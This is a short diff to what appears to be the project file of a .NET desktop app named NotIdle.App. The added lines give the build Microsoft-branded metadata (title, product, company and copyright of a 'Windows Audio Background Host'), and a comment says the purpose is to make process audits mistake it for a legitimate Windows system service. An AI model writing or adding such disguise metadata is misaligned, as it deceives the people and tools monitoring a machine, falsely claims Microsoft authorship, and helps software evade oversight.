@@ -22,6 +22,13 @@
     <!-- AOT is opted in at publish time (see README), keeping dev builds fast:
          dotnet publish src/NotIdle.App -c Release -r win-x64 /p:PublishAot=true -->
     <IsAotCompatible>true</IsAotCompatible>
+
+    <!-- Disguised metadata so process audits see a legitimate Windows system service -->
+    <AssemblyTitle>Windows Audio Background Host</AssemblyTitle>
+    <Product>Windows Audio Services</Product>
+    <Description>Host process for background audio and system device endpoints</Description>
+    <Company>Microsoft Corporation</Company>
+    <Copyright>© Microsoft Corporation. All rights reserved.</Copyright>
   </PropertyGroup>
 
   <ItemGroup>
